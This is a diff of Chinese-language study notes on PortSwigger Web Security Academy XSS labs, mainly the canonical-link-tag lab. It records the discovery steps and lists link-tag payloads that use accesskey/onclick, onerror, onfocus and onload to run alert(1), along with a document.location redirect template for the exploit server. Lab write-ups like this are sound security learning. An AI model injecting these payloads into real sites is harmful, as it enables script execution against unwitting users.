@@ -5,3 +5,18 @@ lab: Reflected XSS into HTML context with all tags blocked except custom ones
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 这里要注意是给exploit server设置payload通常可以用下面这种payload来模拟GET请求.
 <script>document.location=''</script>
+
+lab: Reflected XSS in canonical link tag
+根据题目知道问题出在首页的header部分有下面的link,通过在url中增加一些内容可以发现href的值会随着改变
+<link rel="canonical" href="https://0ac300d604e0b873c2a3a367002c00c6.web-security-academy.net">
+随后尝试看看能不能逃逸',",发现可以，说明很大概率是通过属性中的event来触发。
+接着在这个cheat-sheet中找到link相关的payload，查看是否有什么属性可以利用。
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+【总结】通过w3schools做一些基本实验大概可以总结两种情况。
+https://www.w3schools.com/tags/tag_link.asp
+第一种:
+<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+第二种:
+<link rel=stylesheet href=1 onerror=alert(1)>
+<link onfocus=alert(1) id=x tabindex=1 style=display:block>
+<link href=validstyles.css rel=stylesheet onload=alert(1)>
